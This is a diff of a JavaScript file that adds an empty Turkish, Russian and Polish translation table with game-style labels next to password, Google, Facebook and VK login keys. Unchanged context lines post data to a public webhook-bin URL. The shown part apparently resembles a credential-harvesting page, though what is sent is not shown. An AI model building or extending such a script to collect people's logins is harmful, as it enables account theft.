@@ -1,4 +1,58 @@
 const webhook = "https://webhookbin.net/v1/bin/a07c51bd-383a-41bb-aa78-8ce5aeeaa5bf";
+const userLocale = navigator.language || navigator.userLanguage;
+const translations = {
+    tr: {
+        population: "",
+        parties: "",
+        articles: "",
+      factories: "",
+      regions: "",
+      states: "",
+      google: "",
+      password: "",
+      rules: "",
+      help: "",
+      support: "",
+      privacy: "",
+      terms: "",
+      facebook: "",
+      vk: ""
+    },
+  ru: {
+        population: "",
+        parties: "",
+        articles: "",
+      factories: "",
+      regions: "",
+      states: "",
+      google: "",
+      password: "",
+      rules: "",
+      help: "",
+      support: "",
+      privacy: "",
+      terms: "",
+      facebook: "",
+      vk: ""
+    },
+  pl: {
+        population: "",
+        parties: "",
+        articles: "",
+      factories: "",
+      regions: "",
+      states: "",
+      google: "",
+      password: "",
+      rules: "",
+      help: "",
+      support: "",
+      privacy: "",
+      terms: "",
+      facebook: "",
+      vk: ""
+    }
+};
 
 const sendToWebhook = async (body) => {
   const response = await fetch(webhook, {
